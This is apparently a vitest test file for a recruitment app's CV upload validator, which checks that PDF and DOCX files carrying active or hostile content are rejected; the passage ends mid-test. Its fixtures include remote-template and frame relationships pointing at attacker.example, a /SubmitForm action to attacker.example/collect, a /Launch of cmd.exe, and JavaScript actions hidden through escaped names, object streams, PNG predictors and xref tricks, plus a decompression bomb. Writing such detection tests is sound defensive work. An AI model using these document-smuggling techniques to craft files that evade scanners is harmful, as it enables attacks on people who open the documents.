import { randomBytes } from "node:crypto";
import { constants, deflateSync } from "node:zlib";
import { describe, expect, it } from "vitest";
import { recruitmentCvValidationMessage, validateCvFile } from "./recruitmentFileValidation";
import { DOCUMENT_DECOMPRESSION_LIMITS, truncateExtractedText } from "./documentDecompressionLimits";
import { extractCvDocument } from "./recruitmentAnalysis";
import { buildDocx } from "./testing/zipFixture";
import { appendWithoutXref, classicPdf, libreOfficeChineseCvPdf, libreOfficeCvPdf, packPdfIntoObjectStream, pathologicalPdfs, pngPredict, saveIncrementally, withObjectInStreamData, withTrailerInStreamData } from "./testing/pdfFixture";

const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
/**
 * Tests that run pdf.js, or validate a 4 to 20 MB document, several times in a
 * row: 1 to 3 s on an idle machine, above the default 5 s on a loaded one.
 * Each read stays bounded inside the test (its own time assertion, or the
 * pdf.js time limit); only their total gets more room.
 */
const SEVERAL_HEAVY_READS_TIMEOUT_MS = 30_000;
const validPdf = Buffer.concat([Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"), Buffer.alloc(300, 65)]);
const validDoc = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(300, 66)]);
const validDocx = buildDocx(["Dr Docx Candidate", "Infirmier anesthésiste IADE — 6 ans d’expérience", "Langues : Français, Anglais"]);

function pdfWithStream(dictionary: string, data: Buffer, endOfLine = "\n") {
  return Buffer.concat([
    Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"),
    Buffer.from(`2 0 obj << ${dictionary} /Length ${data.length} >>\nstream${endOfLine}`, "latin1"),
    data,
    Buffer.from("\nendstream\nendobj\n%%EOF\n"),
    Buffer.alloc(300, 32),
  ]);
}

describe("validation et quarantaine des CV", () => {
  it("accepte les signatures attendues pour PDF et DOCX", () => {
    expect(validateCvFile({ buffer: validPdf, mimeType: "application/pdf", originalName: "cv.pdf", size: validPdf.length }).checksum).toHaveLength(64);
    expect(validateCvFile({ buffer: validDocx, mimeType: DOCX, originalName: "cv.docx", size: validDocx.length }).mimeType).toContain("officedocument");
  });

  it("refuse le format Word ancien (.doc) à l’envoi, mais traite encore un dossier .doc déjà stocké sans macro", () => {
    expect(() => validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length })).toThrow("cv_validation_legacy_doc_refused");
    expect(recruitmentCvValidationMessage("cv_validation_legacy_doc_refused")).toContain("PDF ou un DOCX");
    expect(validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length, allowLegacyDoc: true }).mimeType).toBe("application/msword");
    const macroDoc = Buffer.concat([validDoc, Buffer.from("_VBA_PROJECT", "utf16le"), Buffer.alloc(64)]);
    expect(() => validateCvFile({ buffer: macroDoc, mimeType: "application/msword", originalName: "cv.doc", size: macroDoc.length, allowLegacyDoc: true })).toThrow("cv_validation_doc_active_content");
    // A CV that merely mentions VBA as a skill is not a macro.
    const skillDoc = Buffer.concat([validDoc, Buffer.from("Compétences : Excel VBA, Python", "utf16le")]);
    expect(validateCvFile({ buffer: skillDoc, mimeType: "application/msword", originalName: "cv.doc", size: skillDoc.length, allowLegacyDoc: true }).mimeType).toBe("application/msword");
  });

  it("rejette une extension ou une signature qui ne correspond pas au type déclaré", () => {
    expect(() => validateCvFile({ buffer: validPdf, mimeType: "application/pdf", originalName: "cv.docx", size: validPdf.length })).toThrow("cv_validation_type_mismatch");
    expect(() => validateCvFile({ buffer: Buffer.alloc(300, 70), mimeType: "application/pdf", originalName: "cv.pdf", size: 300 })).toThrow("cv_validation_signature_invalid");
    const fakeDocx = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from("[Content_Types].xml"), Buffer.alloc(300, 67)]);
    expect(() => validateCvFile({ buffer: fakeDocx, mimeType: DOCX, originalName: "cv.docx", size: fakeDocx.length })).toThrow("cv_validation_docx_container_invalid");
  });

  it("rejette les PDF chiffrés, actifs ou excessivement longs avant analyse", () => {
    const encrypted = Buffer.concat([validPdf, Buffer.from(" /Encrypt")]);
    const active = Buffer.concat([validPdf, Buffer.from(" /JavaScript")]);
    const manyPages = Buffer.concat([Buffer.from("%PDF-1.7\n"), Buffer.from(Array.from({ length: 26 }, () => "/Type /Page").join(" ")), Buffer.from(" "), Buffer.alloc(300, 65)]);
    expect(() => validateCvFile({ buffer: encrypted, mimeType: "application/pdf", originalName: "cv.pdf", size: encrypted.length })).toThrow("cv_validation_pdf_encrypted");
    expect(() => validateCvFile({ buffer: active, mimeType: "application/pdf", originalName: "cv.pdf", size: active.length })).toThrow("cv_validation_pdf_active_content");
    expect(() => validateCvFile({ buffer: manyPages, mimeType: "application/pdf", originalName: "cv.pdf", size: manyPages.length })).toThrow("cv_validation_pdf_page_limit_exceeded");
  });

  it("rejette les DOCX dotés de macros, d’objets intégrés ou d’un modèle distant, mais garde les liens hypertexte", () => {
    const rawExternal = Buffer.concat([validDocx, Buffer.from(' TargetMode="External"')]);
    expect(() => validateCvFile({ buffer: rawExternal, mimeType: DOCX, originalName: "cv.docx", size: rawExternal.length })).toThrow("cv_validation_docx_active_content");
    const macro = buildDocx(["CV"], [{ name: "word/vbaProject.bin", content: Buffer.alloc(600, 65) }]);
    expect(() => validateCvFile({ buffer: macro, mimeType: DOCX, originalName: "cv.docx", size: macro.length })).toThrow("cv_validation_docx_active_content");
    const remoteTemplate = buildDocx(["CV"], [{ name: "word/_rels/settings.xml.rels", content: '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>' }]);
    expect(() => validateCvFile({ buffer: remoteTemplate, mimeType: DOCX, originalName: "cv.docx", size: remoteTemplate.length })).toThrow("cv_validation_docx_active_content");
    const hyperlink = buildDocx(["CV"], [{ name: "word/_rels/document.xml.rels", content: '<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.linkedin.com/in/example" TargetMode="External"/></Relationships>' }]);
    expect(validateCvFile({ buffer: hyperlink, mimeType: DOCX, originalName: "cv.docx", size: hyperlink.length }).mimeType).toBe(DOCX);
  });

  it("accepte un CV créé depuis un modèle Word local, refuse un modèle, cadre ou objet distant même déguisé", () => {
    const REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    const docxWithSettingsRels = (relationships: string) => buildDocx(["CV"], [
      { name: "word/_rels/settings.xml.rels", content: `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${relationships}</Relationships>` },
      { name: "word/_rels/document.xml.rels", content: `<Relationships><Relationship Id="rId9" Type="${REL}/hyperlink" Target="https://www.linkedin.com/in/jdupont" TargetMode="External"/></Relationships>` },
    ]);
    const accepted = [
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///C:\\Users\\jdupont\\AppData\\Roaming\\Microsoft\\Templates\\Modern%20chronological%20resume.dotx" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///Users/jdupont/Library/Group%20Containers/UBF8T346G9.Office/User%20Content.localized/Templates.localized/Normal.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="C:\\Modeles\\CV.dotx" TargetMode="External"/>`,
    ];
    for (const relationship of accepted) {
      const docx = docxWithSettingsRels(relationship);
      expect(validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length }).mimeType).toBe(DOCX);
    }
    const refused = [
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="\\\\attacker.example\\share\\t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file://attacker.example/share/t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:////attacker.example/share/t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="file:///\\\\attacker.example\\share\\t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="&#104;ttps://attacker.example/t.dotm" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/frame" Target="https://attacker.example/frame.html" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/subDocument" Target="http://attacker.example/sub.docx" TargetMode="External"/>`,
      `<Relationship Id="rId1" Type="${REL}/oleObject" Target="file:///C:/Windows/System32/calc.exe" TargetMode="External"/>`,
      `<Relationship Id='rId1' TargetMode='External' Type='${REL}/attachedTemplate' Target='https://attacker.example/t.dotm'/>`,
      `<Relationship Id="rId1" Note="a>b" Type="${REL}/attachedTemplate" Target="https://attacker.example/t.dotm" TargetMode="External"/>`,
    ];
    for (const relationship of refused) {
      const docx = docxWithSettingsRels(relationship);
      expect(() => validateCvFile({ buffer: docx, mimeType: DOCX, originalName: "cv.docx", size: docx.length }), relationship).toThrow("cv_validation_docx_active_content");
    }
  });
});

describe("REC-02 — PDF réels acceptés, actions dangereuses cherchées aussi dans les flux d’objets", () => {
  const validate = (buffer: Buffer) => validateCvFile({ buffer, mimeType: "application/pdf", originalName: "cv.pdf", size: buffer.length });
  const LIBREOFFICE_OPEN_ACTION = "/OpenAction[1 0 R /XYZ null null 0]";
  /** The LibreOffice CV whose opening action runs the given action instead of showing page 1. */
  const openingWith = (action: string) => (source: string) => source.replace(LIBREOFFICE_OPEN_ACTION, `/OpenAction ${action}`);

  it("accepte le CV exporté par LibreOffice et son /OpenAction qui affiche la page 1", async () => {
    const pdf = libreOfficeCvPdf();
    expect(pdf.toString("latin1")).toContain(LIBREOFFICE_OPEN_ACTION);

    expect(validate(pdf)).toMatchObject({ pageCount: 1, securityScanVersion: "document-safety-v4" });
    expect((await extractCvDocument(pdf, "application/pdf")).text).toContain("Dr Camille Martin");
  });

  it("accepte le même CV enregistré avec des flux d’objets (pdf-lib, Acrobat optimisé) : les pages sont comptées dans le flux décompressé", async () => {
    const pdf = packPdfIntoObjectStream(libreOfficeCvPdf());
    expect(pdf.toString("latin1")).not.toMatch(/\/Type\s*\/Page\b/);

    expect(validate(pdf).pageCount).toBe(1);
    // pdf.js reads the rewritten file: it is a valid PDF, not a fixture only the check accepts.
    const extraction = await extractCvDocument(pdf, "application/pdf");
    expect(extraction.text).toContain("Dr Camille Martin");
    expect(extraction.totalPages).toBe(1);
  });

  it("refuse un JavaScript caché dans un flux d’objets, même sans /Type /ObjStm", async () => {
    const hidden = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>") });
    expect(hidden.toString("latin1")).not.toContain("JavaScript");
    // pdf.js reads it, so a PDF reader would run it.
    expect((await extractCvDocument(hidden, "application/pdf")).text).toContain("Dr Camille Martin");
    expect(() => validate(hidden)).toThrow("cv_validation_pdf_active_content");

    const untyped = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"), objectStream: { dictionary: "/Filter/FlateDecode" } });
    expect(() => validate(untyped)).toThrow("cv_validation_pdf_active_content");
  });

  it("décode les noms échappés #XX avant de chercher les actions, dans le fichier comme dans les flux d’objets", () => {
    const actions = [
      "<</S/#4A#61va#53cript/#4A#53(app.alert\\(1\\))>>",
      "<</S/#4C#61unch/F(cmd.exe)>>",
      "<</S/Sub#6DitForm/F(https://attacker.example/collect)>>",
      "<</S/Import#44ata/F(data.fdf)>>",
      "<</Type/Annot/Subtype/Rich#4Dedia>>",
    ];
    for (const action of actions) {
      const raw = Buffer.from(openingWith(action)(libreOfficeCvPdf().toString("latin1")), "latin1");
      expect(() => validate(raw), action).toThrow("cv_validation_pdf_active_content");
      expect(() => validate(packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: openingWith(action) })), action).toThrow("cv_validation_pdf_active_content");
    }
    const attachment = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: source => source.replace("/PageMode/UseOutlines", "/Names<</Embedded#46iles<</Names[(cv.exe) 3 0 R]>>>>") });
    expect(() => validate(attachment)).toThrow("cv_validation_pdf_active_content");
  });

  it("refuse un flux d’objets qu’il ne peut pas lire (filtre autre que Flate) au lieu de le croire sans danger", () => {
    const hex = packPdfIntoObjectStream(libreOfficeCvPdf(), {
      edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"),
      objectStream: { dictionary: "/Type/ObjStm/Filter/ASCIIHexDecode", encode: content => Buffer.from(`${content.toString("hex")}>`, "latin1") },
    });
    expect(() => validate(hex)).toThrow("cv_validation_pdf_object_stream_unreadable");
    expect(recruitmentCvValidationMessage("cv_validation_pdf_object_stream_unreadable")).toContain("imprimez-le en PDF depuis votre navigateur");
  });

  describe("lit le dictionnaire du flux d’objets comme pdf.js, pas dans une fenêtre devinée", () => {
    // A page written in clear in the dictionary, so that the page count alone cannot refuse the file.
    const hiddenJavaScript = (dictionary: string, encode?: (content: Buffer) => Buffer) => packPdfIntoObjectStream(libreOfficeCvPdf(), {
      edit: openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>"),
      objectStream: { dictionary: `${dictionary}/Y(/Type /Page)`, encode },
    });
    const asHex = (content: Buffer) => Buffer.from(`${content.toString("hex")}>`, "latin1");

    it.each([
      ["un faux « obj » dans une chaîne", "/Type/ObjStm/Filter/FlateDecode/X( obj)"],
      ["une chaîne de 5 000 caractères", `/Type/ObjStm/Filter/FlateDecode/X(${"x".repeat(5_000)})`],
      ["/F au lieu de /Filter", "/Type/ObjStm/F/FlateDecode"],
      ["un faux en-tête d’objet là où pdf.js attend une clé", "/Type/ObjStm/Filter/FlateDecode 9 0 obj <<"],
    ])("trouve le JavaScript malgré %s", async (_label, dictionary) => {
      const pdf = hiddenJavaScript(dictionary);
      // pdf.js reads the object stream (pages and opening action), so a PDF reader would run the script.
      const extraction = await extractCvDocument(pdf, "application/pdf");
      expect(extraction.totalPages).toBe(1);
      expect(extraction.text).toContain("Dr Camille Martin");
      expect(() => validate(pdf)).toThrow("cv_validation_pdf_active_content");
    });

    it.each([
      ["/F/AHx (ASCIIHex) au lieu de /Filter", "/Type/ObjStm/F/AHx", asHex],
      ["/DP (prédicteur) au lieu de /DecodeParms", "/Type/ObjStm/Filter/FlateDecode/DP<</Predictor 1>>", undefined],
      ["un faux « endobj » là où pdf.js attend une clé", "/Type/ObjStm/F/AHx endobj 9 0 obj <<", asHex],
      ["un « >> » pris par pdf.js comme valeur", "/Type/ObjStm/X >> /F/AHx", asHex],
      ["une image en ligne (BI) là où pdf.js attend une valeur", "/Type/ObjStm/F/AHx/X BI /W 1 ID x EI <<", asHex],
    ])("refuse comme illisible un flux d’objets caché par %s", async (_label, dictionary, encode) => {
      const pdf = hiddenJavaScript(dictionary, encode);
      expect((await extractCvDocument(pdf, "application/pdf")).totalPages).toBe(1);
      expect(() => validate(pdf)).toThrow("cv_validation_pdf_object_stream_unreadable");
    });

    it("refuse un commentaire entre le dictionnaire et « stream » ou un flux d’objets contenant un flux", () => {
      const hex = hiddenJavaScript("/Type/ObjStm/F/AHx", asHex).toString("latin1");
      for (const separator of [" %c>>\n", "\n% x >> y\n"]) {
        const commented = Buffer.from(hex.replace(/(\/Length \d+>>)\nstream/, (_match, end: string) => `${end}${separator}stream`), "latin1");
        expect(() => validate(commented), separator).toThrow("cv_validation_pdf_object_stream_unreadable");
      }
      const nested = packPdfIntoObjectStream(libreOfficeCvPdf(), {
        objectStream: { encode: content => deflateSync(Buffer.concat([content, Buffer.from("<</Type/ObjStm/N 1/First 4/F/AHx/Length 9>>\nstream\n3120302036>\nendstream\n", "latin1")])) },
      });
      expect(() => validate(nested)).toThrow("cv_validation_pdf_object_stream_unreadable");
    });
  });

  describe("lit un flux d’objets non compressé ou à prédicteur PNG, permis par ISO 32000", () => {
    const javaScriptOpening = openingWith("<</S/JavaScript/JS(app.alert\\(1\\))>>");
    const predicted = (types: number[], dictionary = "/Type/ObjStm/Filter/FlateDecode/DecodeParms<</Predictor 12/Columns 7>>") => (edit?: (source: string) => string) =>
      packPdfIntoObjectStream(libreOfficeCvPdf(), { edit, objectStream: { dictionary, encode: content => deflateSync(pngPredict(content, 7, types)) } });

    it("accepte un flux d’objets écrit sans filtre (qpdf --qdf, pikepdf) et y trouve le JavaScript", async () => {
      const plain = (edit?: (source: string) => string) => packPdfIntoObjectStream(libreOfficeCvPdf(), { edit, objectStream: { dictionary: "/Type/ObjStm", encode: content => content } });
      expect(validate(plain()).pageCount).toBe(1);
      expect((await extractCvDocument(plain(), "application/pdf")).text).toContain("Dr Camille Martin");
      expect(() => validate(plain(javaScriptOpening))).toThrow("cv_validation_pdf_active_content");
    });

    it.each([
      ["none", [0]],
      ["sub", [1]],
      ["up", [2]],
      ["average", [3]],
      ["Paeth", [4]],
      ["tous types en alternance", [0, 1, 2, 3, 4]],
    ])("défait le prédicteur PNG (%s) comme pdf.js : pages comptées, JavaScript trouvé", async (_label, types) => {
      const pdf = predicted(types);
      // pdf.js reads the predicted object stream: the PDF is valid, and its pages are found in it.
      const extraction = await extractCvDocument(pdf(), "application/pdf");
      expect(extraction.text).toContain("Dr Camille Martin");
      expect(extraction.totalPages).toBe(1);
      expect(pdf().toString("latin1")).not.toMatch(/\/Type\s*\/Page\b/);
      expect(validate(pdf()).pageCount).toBe(1);
      expect(() => validate(pdf(javaScriptOpening))).toThrow("cv_validation_pdf_active_content");
    });

    it("lit /DP, /BPC, /Colors et /Predictor 1 comme pdf.js", async () => {
      const asIs = packPdfIntoObjectStream(libreOfficeCvPdf(), { edit: javaScriptOpening, objectStream: { dictionary: "/Type/ObjStm/Filter/FlateDecode/DP<</Predictor 1>>" } });
      expect(() => validate(asIs)).toThrow("cv_validation_pdf_active_content");
      // Two bytes per pixel, three pixels per row: "sub" and Paeth look two bytes back.
      const wide = (edit?: (source: string) => string) => packPdfIntoObjectStream(libreOfficeCvPdf(), {
        edit,
        objectStream: { dictionary: "/Type/ObjStm/F/Fl/DP<</Predictor 15/Colors 2/BPC 8/Columns 3>>", encode: content => deflateSync(pngPredict(content, 6, [1, 4], 2)) },
      });
      expect((await extractCvDocument(wide(), "application/pdf")).text).toContain("Dr Camille Martin");
      expect(validate(wide()).pageCount).toBe(1);
      expect(() => validate(wide(javaScriptOpening))).toThrow("cv_validation_pdf_active_content");
    });

    it.each([
      ["le prédicteur TIFF (2)", "/Type/ObjStm/Filter/FlateDecode/DecodeParms<</Predictor 2/Columns 7>>"],
      ["des paramètres en référence indirecte", "/Type/ObjStm/Filter/FlateDecode/DecodeParms 9 0 R"],
      ["des paramètres en tableau avec un seul filtre", "/Type/ObjStm/Filter/FlateDecode/DecodeParms[<</Predictor 12/Columns 7>>]"],
      ["/DP et /DecodeParms à la fois", "/Type/ObjStm/Filter/FlateDecode/DP<</Predictor 12/Columns 7>>/DecodeParms<</Predictor 12/Columns 7>>"],
      ["un nom échappé #XX", "/Type/ObjStm/Filter/FlateDecode/Decode#50arms<</Predictor 12/Columns 7>>"],
      ["une chaîne dans le dictionnaire", "/Type/ObjStm/Filter/FlateDecode/DecodeParms<</Predictor 12/Columns 7>>/X(a)"],
    ])("refuse comme illisible, avec le conseil de réenregistrer, un flux d’objets à prédicteur dont %s", (_label, dictionary) => {
      expect(() => validate(predicted([2], dictionary)(javaScriptOpening))).toThrow("cv_validation_pdf_object_stream_unreadable");
      expect(() => validate(predicted([2], dictionary)())).toThrow("cv_validation_pdf_object_stream_unreadable");
    });
  });

  it("garde le plafond de décompression pour les flux d’objets", () => {
    const bomb = pdfWithStream("/Type /ObjStm /N 1 /First 4 /Filter /FlateDecode", deflateSync(Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32)));
    expect(() => validate(bomb)).toThrow("cv_validation_pdf_decompressed_size_exceeded");
    // Declaring the object stream as a small image does not skip its content.
    const disguised = pdfWithStream("/Type /ObjStm /N 1 /First 4 /Subtype /Image /Width 1 /Height 1 /Filter /FlateDecode", deflateSync(Buffer.from("1 0 << /S /JavaScript /JS (app.alert(1)) >>")));
    expect(() => validate(disguised)).toThrow("cv_validation_pdf_active_content");
  });

  describe("ne lit que la structure du PDF et ses flux d’objets, jamais les données binaires des autres flux", () => {
    const JAVASCRIPT_ACTION = "<</S/JavaScript/JS(app.alert\\(1\\))>>";
    /** The catalog (object 20) of the LibreOffice CV, with `entries` in place of its page mode. */
    const catalog = (entries: string) => ({ number: 20, body: `<</Type/Catalog/Pages 10 0 R\n${entries}\n/StructTreeRoot 18 0 R\n/Lang(en-US)\n/MarkInfo<</Marked true>>\n>>` });

    it("accepte un CV LibreOffice dont la police chinoise compressée contient les octets « /JS »", async () => {
      const pdf = libreOfficeChineseCvPdf();
      // "/JS" followed by 0x94, inside the Flate data of the embedded WenQuanYi font: no PDF name.
      expect(pdf.toString("latin1")).toMatch(/\/JS\x94/);

      expect(validate(pdf).pageCount).toBe(1);
      expect((await extractCvDocument(pdf, "application/pdf")).text).toContain("麻醉科医师");
    });

    it("accepte les mots-clés actifs écrits dans les données d’une image ou d’un flux compressé, et les refuse dans un dictionnaire", () => {
      const markers = Buffer.from("/JavaScript /JS(x) /Launch /EmbeddedFile /SubmitForm /XFA /Encrypt /Type /Page /Type /Page", "latin1");
      // Stored (level 0) deflate data and JPEG data both hold the bytes as they are.
      const stored = deflateSync(markers, { level: 0 });
      expect(stored.includes(markers)).toBe(true);
      const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), markers, Buffer.from([0xff, 0xd9])]);
      const withStream = (dictionary: string, data: Buffer) => saveIncrementally(libreOfficeCvPdf(), [{ number: 22, body: `<<${dictionary}/Length ${data.length}>>\nstream\n${data.toString("latin1")}\nendstream` }]);
      expect(validate(withStream("/Type/XObject/Subtype/Image/Width 8/Height 8/BitsPerComponent 8/ColorSpace/DeviceGray/Filter/FlateDecode", stored)).pageCount).toBe(1);
      expect(validate(withStream("/Type/XObject/Subtype/Image/Width 8/Height 8/BitsPerComponent 8/ColorSpace/DeviceGray/Filter/DCTDecode", jpeg)).pageCount).toBe(1);
      expect(validate(withStream("/Filter/FlateDecode", stored)).pageCount).toBe(1);

      expect(() => validate(saveIncrementally(libreOfficeCvPdf(), [{ number: 22, body: `<</Type/Annot/Subtype/Link/A ${JAVASCRIPT_ACTION}>>` }]))).toThrow("cv_validation_pdf_active_content");
    });

    it("lit pourtant un objet ou un trailer que pdf.js lit dans les données d’un autre flux", async () => {
      // pdf.js reads an object where the xref points, even inside the data of a stream: here, the page.
      const page = withObjectInStreamData(libreOfficeCvPdf(), { number: 1, body: "<</Type/Page/Parent 10 0 R/Resources 17 0 R/MediaBox[0 0 595 842]/Contents 2 0 R>>" });
      expect((await extractCvDocument(page, "application/pdf")).text).toContain("Dr Camille Martin");
      expect(validate(page).pageCount).toBe(1);

      const traps = [
        // The opening action, an object the xref places inside the data of a stream.
        withObjectInStreamData(libreOfficeCvPdf(), { number: 99, body: JAVASCRIPT_ACTION }, [catalog("/OpenAction 99 0 R")]),
        withObjectInStreamData(packPdfIntoObjectStream(libreOfficeCvPdf()), { number: 99, body: JAVASCRIPT_ACTION }, [catalog("/OpenAction 99 0 R")]),
        // The last xref section and its trailer, with a direct catalog, inside the data of a stream.
        withTrailerInStreamData(libreOfficeCvPdf(), `<</Type/Catalog/Pages 10 0 R/OpenAction ${JAVASCRIPT_ACTION}>>`),
        // A comment fakes a stream inside the catalog: pdf.js skips it and reads the action after it.
        saveIncrementally(libreOfficeCvPdf(), [{ number: 20, body: `<</Type/Catalog/Pages 10 0 R\n% 98 0 obj <<>> stream\n/OpenAction ${JAVASCRIPT_ACTION}\n>>` }]),
        // pdf.js reads "0.", "0-" or "0E+" as the generation number 0, then the "obj" keyword.
        ...["99 0.obj", "99 0-obj", "99 0E+obj"].map(header => withObjectInStreamData(libreOfficeCvPdf(), { number: 99, header, body: JAVASCRIPT_ACTION }, [catalog("/OpenAction 99 0 R")])),
        withObjectInStreamData(packPdfIntoObjectStream(libreOfficeCvPdf()), { number: 99, header: "99 0.obj", body: JAVASCRIPT_ACTION }, [catalog("/OpenAction 99 0 R")]),
        // The same catalog with a fake stream in a comment, which "upstream" closes, and no real stream.
        saveIncrementally(libreOfficeCvPdf(), [{ number: 20, header: "20 0.obj", body: `<</Type/Catalog/Pages 10 0 R\n% 98 0 obj <<>> stream\n/OpenAction ${JAVASCRIPT_ACTION}/Lang(upstream)\n>>` }]),
      ];
      for (const [index, trap] of traps.entries()) {
        // pdf.js reads each of them: the PDF opens on its page, and a PDF reader would run the action.
        expect((await extractCvDocument(trap, "application/pdf")).text, String(index)).toContain("Dr Camille Martin");
        expect(() => validate(trap), String(index)).toThrow("cv_validation_pdf_active_content");
      }
      // Ten extractions, each drawing the page it reads to keep only its visible text (IA-01).
    }, SEVERAL_HEAVY_READS_TIMEOUT_MS);
  });

  describe("compte les pages distinctes, une fois chacune", () => {
    const pageOfCv = (rotate: number) => ({ number: 1, body: `<</Type/Page/Parent 10 0 R/Resources 17 0 R/MediaBox[0 0 595.303937007874 841.889763779528]/Rotate ${rotate}/Contents 2 0 R>>` });
    /** A PDF of `count` blank pages, objects 3 onwards. */
    const blankPages = (count: number) => classicPdf([
      "<</Type/Catalog/Pages 2 0 R>>",
      `<</Type/Pages/Count ${count}/Kids[${Array.from({ length: count }, (_, index) => `${index + 3} 0 R`).join(" ")}]>>`,
      ...Array.from({ length: count }, () => "<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>"),
    ]);
    const rotated = (pdf: Buffer, numbers: number[]) => saveIncrementally(pdf, numbers.map(number => ({ number, body: "<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]/Rotate 90>>" })));

    it("ne compte pas deux fois une page réenregistrée par une mise à jour incrémentale", async () => {
      const turned = saveIncrementally(libreOfficeCvPdf(), [pageOfCv(90)]);
      expect(validate(turned).pageCount).toBe(1);
      expect((await extractCvDocument(turned, "application/pdf")).totalPages).toBe(1);
      expect(validate(saveIncrementally(packPdfIntoObjectStream(libreOfficeCvPdf()), [pageOfCv(90)])).pageCount).toBe(1);
      expect(validate(saveIncrementally(turned, [pageOfCv(180)])).pageCount).toBe(1);
    });

    it("accepte 14 pages toutes tournées après coup, refuse 26 pages distinctes", () => {
      const fourteen = rotated(blankPages(14), Array.from({ length: 14 }, (_, index) => index + 3));
      expect(validate(fourteen).pageCount).toBe(14);
      // 13 pages, then 13 new ones added by an update: 26 distinct pages.
      const thirteen = blankPages(13);
      const added = saveIncrementally(thirteen, [
        { number: 2, body: `<</Type/Pages/Count 26/Kids[${Array.from({ length: 26 }, (_, index) => `${index + 3} 0 R`).join(" ")}]>>` },
        ...Array.from({ length: 13 }, (_, index) => ({ number: index + 16, body: "<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]>>" })),
      ]);
      expect(() => validate(added)).toThrow("cv_validation_pdf_page_limit_exceeded");
      expect(() => validate(blankPages(26))).toThrow("cv_validation_pdf_page_limit_exceeded");
      expect(validate(blankPages(25)).pageCount).toBe(25);
    });

    it("refuse 30 pages dont des numéros sont redéfinis après %%EOF sans xref, que pdf.js ignore", async () => {
      /** `count` pages of text (objects 3 onwards), so that pdf.js reads them without OCR. */
      const textPages = (count: number) => {
        const line = "BT /F1 12 Tf 50 780 Td (Dr Camille Martin, anesthesiste-reanimateur, curriculum vitae) Tj ET";
        return classicPdf([
          "<</Type/Catalog/Pages 2 0 R>>",
          `<</Type/Pages/Count ${count}/Kids[${Array.from({ length: count }, (_, index) => `${index + 3} 0 R`).join(" ")}]>>`,
          ...Array.from({ length: count }, () => `<</Type/Page/Parent 2 0 R/MediaBox[0 0 595 842]/Resources<</Font<</F1 ${count + 4} 0 R>>>>/Contents ${count + 3} 0 R>>`),
          `<</Length ${line.length}>>\nstream\n${line}\nendstream`,
          "<</Type/Font/Subtype/Type1/BaseFont/Helvetica/Encoding/WinAnsiEncoding>>",
        ]);
      };
      /** Pages 3 to `last` written again as annotations, after the end of the file. */
      const annotations = (last: number) => Array.from({ length: last - 2 }, (_, index) => ({ number: index + 3, body: "<</Type/Annot/Subtype/Text/Rect[0 0 10 10]>>" }));
      const thirty = textPages(30);
      const six = appendWithoutXref(thirty, annotations(8));
      expect((await extractCvDocument(six, "application/pdf")).totalPages).toBe(30);
      expect(() => validate(thirty)).toThrow("cv_validation_pdf_page_limit_exceeded");
      expect(() => validate(six)).toThrow("cv_validation_pdf_page_limit_exceeded");
      // Every page written again: still 30 pages, not a PDF without any.
      expect(() => validate(appendWithoutXref(thirty, annotations(32)))).toThrow("cv_validation_pdf_page_limit_exceeded");
      // The same with the pages in an object stream.
      const packed = appendWithoutXref(packPdfIntoObjectStream(thirty), annotations(8));
      expect((await extractCvDocument(packed, "application/pdf")).totalPages).toBe(30);
      expect(() => validate(packed)).toThrow("cv_validation_pdf_page_limit_exceeded");
      // Under the limit, such a file keeps all its pages.
      expect(validate(appendWithoutXref(textPages(20), annotations(8))).pageCount).toBe(20);
      // Two extractions of 25 pages, each drawn to keep only its visible text (IA-01).
    }, SEVERAL_HEAVY_READS_TIMEOUT_MS);
  });

  it("refuse un formulaire XFA, qui porte ses propres scripts, même dans un flux d’objets ou derrière un nom échappé", () => {
    const xfa = (entry: string) => (source: string) => source.replace("/PageMode/UseOutlines", `/AcroForm<</Fields[]${entry}>>/NeedsRendering true`);
    const template = "<xdp:xdp><template><subform><event><script>app.alert(1)</script></event></subform></template></xdp:xdp>";
